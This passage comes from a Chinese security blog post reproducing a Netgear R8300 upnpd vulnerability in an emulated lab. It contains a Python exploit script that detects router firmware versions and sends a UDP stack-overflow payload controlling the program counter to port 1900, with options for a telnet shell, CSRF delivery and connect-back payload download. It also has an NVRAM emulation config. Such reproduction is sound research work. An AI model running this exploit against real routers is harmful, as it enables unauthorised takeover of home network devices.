0x348b8,</span><br><span class="line">		&quot;1.0.2.80&quot;  : 0x348b8,</span><br><span class="line">		&quot;1.0.2.48&quot;  : 0x340b8,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">firmware_version_to_human_version = &#123;</span><br><span class="line">	&quot;R8300&quot; : &#123;</span><br><span class="line">		# These version strings may be slightly off. Versions 1.0.2.128 and 1.0.2.130 only used</span><br><span class="line">		# the short versions, rather than the full version string like other models.</span><br><span class="line">		&quot;V1.0.2.130&quot;        : &quot;1.0.2.130&quot;,</span><br><span class="line">		&quot;V1.0.2.128&quot;        : &quot;1.0.2.128&quot;,</span><br><span class="line">		&quot;V1.0.2.122_1.0.94&quot; : &quot;1.0.2.122&quot;,</span><br><span class="line">		&quot;V1.0.2.116_1.0.90&quot; : &quot;1.0.2.116&quot;,</span><br><span class="line">		&quot;V1.0.2.106_1.0.85&quot; : &quot;1.0.2.106&quot;,</span><br><span class="line">		&quot;V1.0.2.100_1.0.82&quot; : &quot;1.0.2.100&quot;,</span><br><span class="line">		&quot;V1.0.2.94_1.0.79&quot;  : &quot;1.0.2.94&quot;,</span><br><span class="line">		&quot;V1.0.2.86_1.0.75&quot;  : &quot;1.0.2.86&quot;,</span><br><span class="line">		&quot;V1.0.2.80_1.0.71&quot;  : &quot;1.0.2.80&quot;,</span><br><span class="line">		&quot;V1.0.2.48_1.0.52&quot;  : &quot;1.0.2.48&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_devices = &#123;&quot;WNR3500&quot; : &quot;arm_lsb&quot;, &quot;WNCE3001&quot; : &quot;mips_msb&quot;&#125;</span><br><span class="line"></span><br><span class="line">def send(ip, port, is_https, payload, keep_open = False):</span><br><span class="line">	if is_https:</span><br><span class="line">		return send_ssl(ip, port, payload, keep_open)</span><br><span class="line">	else:</span><br><span class="line">		return send_plain(ip, port, payload, keep_open)</span><br><span class="line"></span><br><span class="line">def send_plain(ip, port, payload, keep_open):</span><br><span class="line">	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">	sock.connect((ip, port))</span><br><span class="line">	sock.send(payload)</span><br><span class="line">	if keep_open:</span><br><span class="line">		return sock</span><br><span class="line">	sock.close()</span><br><span class="line"></span><br><span class="line">def send_ssl(ip, port, payload, keep_open):</span><br><span class="line">	import ssl</span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	wrappedSocket = ssl.wrap_socket(sock)</span><br><span class="line">	wrappedSocket.connect((ip, port))</span><br><span class="line">	wrappedSocket.send(payload)</span><br><span class="line">	if keep_open:</span><br><span class="line">		return wrappedSocket</span><br><span class="line">	wrappedSocket.close()</span><br><span class="line">	</span><br><span class="line">def find_item(contents, start_string):</span><br><span class="line">	start = contents.find(start_string)</span><br><span class="line">	if(start == -1):</span><br><span class="line">		print(&quot;Failed to automatically detect version.&quot;)</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">	start += len(start_string)</span><br><span class="line">	end = contents.find(&quot;\r\n&quot;, start)</span><br><span class="line">	return contents[start:end].upper() # upper just in case</span><br><span class="line"></span><br><span class="line">def detect_model_version(ip, port, is_https):</span><br><span class="line">	request = &quot;GET /currentsetting.htm HTTP/1.1\r\nHost: &#123;&#125;\r\n\r\n&quot;.format(ip)</span><br><span class="line">	sock = send(ip, port, is_https, request, True)</span><br><span class="line"></span><br><span class="line">	contents = &quot;&quot;</span><br><span class="line">	while contents.find(&quot;InternetConnectionStatus&quot;) == -1 and contents.find(&quot;401 Unauthorized&quot;) == -1:</span><br><span class="line">		contents += sock.recv(1)</span><br><span class="line"></span><br><span class="line">	# Some older models/versions don&apos;t have the currentsetting.htm page, or it&apos;s protected by login</span><br><span class="line">	if contents.find(&quot;401 Unauthorized&quot;) != -1:</span><br><span class="line">		print(&quot;Version detection against this router is not possible using currentsetting.htm.&quot;)</span><br><span class="line">		print(&quot;Received response:\n&#123;&#125;\n&quot;.format(contents))</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">	model = find_item(contents, &quot;Model=&quot;)</span><br><span class="line">	firmware_version = find_item(contents, &quot;Firmware=&quot;)</span><br><span class="line"></span><br><span class="line">	if (model not in firmware_version_to_human_version.keys() or</span><br><span class="line">			firmware_version not in firmware_version_to_human_version[model]):</span><br><span class="line">		print(&quot;Unknown model and version: &#123;&#125; &#123;&#125;&quot;.format(model, firmware_version))</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">	return model, firmware_version_to_human_version[model][firmware_version]</span><br><span class="line">	</span><br><span class="line">def main(args):</span><br><span class="line">	# find version</span><br><span class="line">	if args.version == &quot;&quot; or args.model == &quot;&quot;:</span><br><span class="line">		if args.csrf:</span><br><span class="line">			print(&quot;The model and version cannot be automatically determined in CSRF mode.&quot;)</span><br><span class="line">			sys.exit(1)</span><br><span class="line">		args.model, args.version = detect_model_version(args.ip, args.port, args.https)</span><br><span class="line">		print(&quot;Automatically detected model &#123;&#125; and version &#123;&#125;&quot;.format(args.model, args.version))</span><br><span class="line">	</span><br><span class="line">	# prove</span><br><span class="line">	p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">	payload = (</span><br><span class="line">		0x604 * b&apos;a&apos; + # 0x7eb1d5ec</span><br><span class="line">		p32(0x7eb1d5ec) +  # v51</span><br><span class="line">		(0x634 - 0x604 - 8) * b&apos;a&apos; +</span><br><span class="line">		p32(0x43434343)  # PC</span><br><span class="line">	)</span><br><span class="line">	s.connect((&apos;192.168.65.2&apos;, 1900))</span><br><span class="line">	s.send(payload)</span><br><span class="line">	s.close()</span><br><span class="line">			</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;Run the exploit&apos;)</span><br><span class="line">	parser.add_argument(&apos;ip&apos;, type=str, default=None, help=&apos;The IP address of the webserver to exploit&apos;)</span><br><span class="line">	parser.add_argument(&apos;-command&apos;, type=str, default=&quot;START_TELNET&quot;, help=&apos;The command to run; default is to start telnet on port 8888 (or 3333 if 8888 is already used)&apos;)</span><br><span class="line">	parser.add_argument(&apos;-csrf&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run a web server that sends the exploit as a CSRF payload&apos;)</span><br><span class="line">	parser.add_argument(&apos;-https&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run the exploit against a webserver running HTTPS&apos;)</span><br><span class="line">	parser.add_argument(&apos;-file&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Write the exploit firmware to a file (which typically&apos;</span><br><span class="line">		+ &apos; has a file extension .chk). Use the ip argument to specify the filename.&apos;)</span><br><span class="line">	parser.add_argument(&apos;-port&apos;, type=int, default=80, help=&apos;The port of the webserver to exploit&apos;)</span><br><span class="line">	parser.add_argument(&apos;-model&apos;, type=str, default=&quot;&quot;, help=&apos;The model of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">		+ &apos; Supported models are: &#123;&#125;&apos;.format(&quot;, &quot;.join(address_info.keys())))</span><br><span class="line">	parser.add_argument(&apos;-version&apos;, type=str, default=&quot;&quot;, help=&apos;The version of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">		+ &apos; Supported versions are: &#123;&#125;&apos;.format(&quot;; &quot;.join([&quot;&#123;&#125;: &#123;&#125;&quot;.format(x, &quot;, &quot;.join(address_info[x])) for x in address_info.keys()])))</span><br><span class="line">	parser.add_argument(&apos;-local_ip&apos;, type=str, default=&quot;&quot;, help=&apos;The IP address the exploited host should connect back to download a&apos;</span><br><span class="line">		+ &apos; payload, only used on the devices: &#123;&#125; (default autodetect).&apos;.format(&quot;, &quot;.join(ftp_devices.keys())))</span><br><span class="line">	parser.add_argument(&apos;-version-only&apos;, required=False, action=&apos;store_true&apos;, help=&quot;Only detect the model/version of a device, don&apos;t exploit&quot;)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	args.model = args.model.upper()</span><br><span class="line"></span><br><span class="line">	main(args)</span><br></pre></td></tr></table></figure>
+
+<p>脚本还有点儿问题</p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="获取ARM架构的libc-so-6文件方法"><a href="#获取ARM架构的libc-so-6文件方法" class="headerlink" title="获取ARM架构的libc.so.6文件方法"></a><a href="https://www.cnblogs.com/from-zero/p/12606867.html" target="_blank" rel="noopener">获取ARM架构的libc.so.6文件方法</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-cache search libc6 | grep armel</span><br><span class="line">$ sudo apt-get install libc6-armel-cross【举例】</span><br><span class="line">共享库目录</span><br><span class="line">/usr/arm-linux-gnueabi</span><br></pre></td></tr></table></figure>
+
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># 1_config.h</span><br><span class="line"></span><br><span class="line">#ifndef INCLUDE_CONFIG_H</span><br><span class="line">#define INCLUDE_CONFIG_H</span><br><span class="line"></span><br><span class="line">// Determines whether debugging information should be printed to stderr.</span><br><span class="line">#define DEBUG               1</span><br><span class="line">// Determines the size of the internal buffer, used for manipulating and storing key values, etc.</span><br><span class="line">#define BUFFER_SIZE         256</span><br><span class="line">// Determines the size of the &quot;emulated&quot; NVRAM, used by nvram_get_nvramspace().</span><br><span class="line">#define NVRAM_SIZE          2048</span><br><span class="line">// Determines the maximum size of the user-supplied output buffer when a length is not supplied.</span><br><span class="line">#define USER_BUFFER_SIZE    64</span><br><span class="line">// Determines the unique separator character (as string) used for the list implementation. Do not use &quot;\0&quot;.</span><br><span class="line">#define LIST_SEP            &quot;\xff&quot;</span><br><span class="line">// Special argument used to change the semantics of the nvram_list_exist() function.</span><br><span class="line">#define LIST_MAGIC          0xdeadbeef</span><br><span class="line">// Identifier value used to generate IPC key in ftok()</span><br><span class="line">#define IPC_KEY             &apos;A&apos;</span><br><span class="line">// Timeout for the semaphore</span><br><span class="line">#define IPC_TIMEOUT         1000</span><br><span class="line">// Mount point of the base NVRAM implementation.</span><br><span class="line">#define MOUNT_POINT         &quot;/firmadyne/libnvram/&quot;</span><br><span class="line">// Location of NVRAM override values that are copied into the base NVRAM implementation.</span><br><span class="line">#define OVERRIDE_POINT      &quot;/firmadyne/libnvram.override/&quot;</span><br><span class="line"></span><br><span class="line">// Define the semantics for success and failure error codes.</span><br><span class="line">#define E_FAILURE  0</span><br><span class="line">#define E_SUCCESS  1</span><br><span class="line"></span><br><span class="line">// Default paths for NVRAM default values.</span><br><span class="line">#define NVRAM_DEFAULTS_PATH \</span><br><span class="line">    /* &quot;DIR-505L_FIRMWARE_1.01.ZIP&quot; (10497) */ \</span><br><span class="line">    PATH(&quot;/var/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DIR-615_REVE_FIRMWARE_5.11.ZIP&quot; (9753) */ \</span><br><span class="line">    PATH(&quot;/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DGL-5500_REVA_FIRMWARE_1.12B05.ZIP&quot; (9469) */ \</span><br><span class="line">    TABLE(router_defaults) \</span><br><span class="line">    PATH(&quot;/etc/nvram.conf&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.deft&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.update&quot;) \</span><br><span class="line">    TABLE(Nvrams) \</span><br><span class="line">    PATH(&quot;/etc/wlan/nvram_params&quot;) \</span><br><span class="line">    PATH(&quot;/etc/system_nvram_defaults&quot;)</span><br><span class="line"></span><br><span class="line">// Default values for NVRAM.</span><br><span class="line">#define NVRAM_DEFAULTS \</span><br><span class="line">	/* Used by Netgear router: enable upnpd log */\</span><br><span class="line">	ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">	/* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;R8500&quot;)\</span><br><span class="line">    ENTRY(&quot;friendly_name&quot;, nvram_set, &quot;R8300&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_enable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_turn_on&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_period&quot;, nvram_set, &quot;30&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_ttl&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_portmap_entry&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_duration&quot;, nvram_set, &quot;3600&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_DHCPServerConfigurable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;wps_is_upnp&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_sa_uuid&quot;, nvram_set, &quot;00000000000000000000&quot;)\</span><br><span class="line">    ENTRY(&quot;lan_hwaddr&quot;, nvram_set, &quot;AA:BB:CC:DD:EE:FF&quot;)\</span><br><span class="line">    \</span><br><span class="line">    /* Linux kernel log level, used by &quot;WRT54G3G_2.11.05_ETSI_code.bin&quot; (305) */ \</span><br><span class="line">    ENTRY(&quot;console_loglevel&quot;, nvram_set, &quot;7&quot;) \</span><br><span class="line">    /* Reset NVRAM to default at bootup, used by &quot;WNR3500v2-V1.0.2.10_23.0.70NA.chk&quot; (1018) */ \</span><br><span class="line">    ENTRY(&quot;restore_defaults&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    ENTRY(&quot;sku_name&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;wla_wlanstate&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_if&quot;, nvram_set, &quot;br0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ipaddr&quot;, nvram_set, &quot;192.168.65.135&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_bipaddr&quot;, nvram_set, &quot;192.168.65.255&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    /* Set default timezone, required by multiple images */ \</span><br><span class="line">    ENTRY(&quot;time_zone&quot;, nvram_set, &quot;EST5EDT&quot;) \</span><br><span class="line">    /* Set default WAN MAC address, used by &quot;NBG-416N_V1.00(USA.7)C0.zip&quot; (12786) */ \</span><br><span class="line">    ENTRY(&quot;wan_hwaddr_def&quot;, nvram_set, &quot;01:23:45:67:89:ab&quot;) \</span><br><span class="line">    /* Attempt to define LAN/WAN interfaces */ \</span><br><span class="line">    ENTRY(&quot;wan_ifname&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ifnames&quot;, nvram_set, &quot;eth1 eth2 eth3 eth4&quot;) \</span><br><span class="line">    /* Used by &quot;TEW-638v2%201.1.5.zip&quot; (12898) to prevent crash in &apos;goahead&apos; */ \</span><br><span class="line">    ENTRY(&quot;ethConver&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    /* Used by &quot;Firmware_TEW-411BRPplus_2.07_EU.zip&quot; (13649) to prevent crash in &apos;init&apos; */ \</span><br><span class="line">    ENTRY(&quot;lan_proto&quot;, nvram_set, &quot;dhcp&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_ipaddr&quot;, nvram_set, &quot;0.0.0.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wanif&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    /* Used by &quot;DGND3700 Firmware Version 1.0.0.17(NA).zip&quot; (3425) to prevent crashes */ \</span><br><span class="line">    ENTRY(&quot;time_zone_x&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;rip_multicast&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;bs_trustedip_enable&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    /* Used by Netgear router: enable upnpd log */ \</span><br><span class="line">    ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;3&quot;) \</span><br><span class="line">    /* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;MP1T99&quot;)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/iot/">iot</a><a href="/tags/漏洞复现/">漏洞复现</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2021/02/04/路由器/CVE-2019-17137复现/" title="Netgear R6220 认证绕过复现 cve-2019-17137">
+  <span>
+  Netgear R6220 认证绕过复现 cve-2019-17137</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2020/10/04/tw/tw secret_of_my_heart/"  title="pwnable.tw secret_of_my_heart wp">
+ <span>pwnable.tw secret_of_my_heart wp
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>18</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>23</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>34</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>22</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>17</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>14</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HDU/" title="HDU">HDU<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/复现/" title="复现">复现<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/漏洞复现/" title="漏洞复现">漏洞复现<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2021 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
